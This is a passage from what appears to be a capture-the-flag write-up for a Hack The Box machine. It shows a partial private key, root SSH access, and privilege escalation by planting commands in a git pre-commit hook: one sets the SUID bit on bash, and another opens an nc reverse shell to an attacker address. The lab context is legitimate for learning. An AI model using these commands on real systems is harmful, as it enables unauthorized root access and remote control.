21kLS+mSxwwKm5XWZk8fyw4pBhlrCVyuSBK7UlHJTcNDhzcxxzqW2KYACUQ=
-----END RSA PRIVATE KEY-----
```
```console
└─$ ssh root@10.129.59.80 -i id_rsa
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Sep 28 19:26:51 UTC 2022

  System load:  0.5               Processes:              242
  Usage of /:   76.8% of 3.48GB   Users logged in:        1
  Memory usage: 29%               IP address for eth0:    10.129.59.80
  Swap usage:   0%                IP address for docker0: 172.17.0.1


16 updates can be applied immediately.
9 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri May 20 12:36:53 2022
root@opensource:~# cat /root/root.tt
cat: /root/root.tt: No such file or directory
root@opensource:~# cat /root/root.txt
5916****************************
root@opensource:~# 
```

Below are some other versions from other users that I found. I especially like the method of changing the suid bit on bash for PE.


```console
dev01@opensource:~$ echo "chmod u+s /bin/bash" >> /home/dev01/.git/hooks/pre-commit
dev01@opensource:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr 18 15:08 /bin/bash
dev01@opensource:~$ bash -p
bash-4.4# whoami
root
bash-4.4# id
uid=1000(dev01) gid=1000(dev01) euid=0(root) groups=1000(dev01)
bash-4.4# 
```

Last but not least we have a reverse shell!


```
dev01@opensource:~$ echo '#!/bin/sh' > /home/dev01/.git/hooks/pre-commit && chmod +x /home/dev01/.git/hooks/pre-commit && echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.10 1234 >/tmp/f' >> /home/dev01/.git/hooks/pre-commit
```
```console
└─$ nc -lvnp 1234                   
listening on [any] 1234 ...
connect to [10.10.16.10] from (UNKNOWN) [10.129.59.80] 34330
/bin/sh: 0: can't access tty; job control turned off
# cat /root/root.txt
5916****************************
# 
```
Footholds have been pretty difficult for me lately but its nice to get some help. 

GG everyone and I hoped you all learned something as I did :)
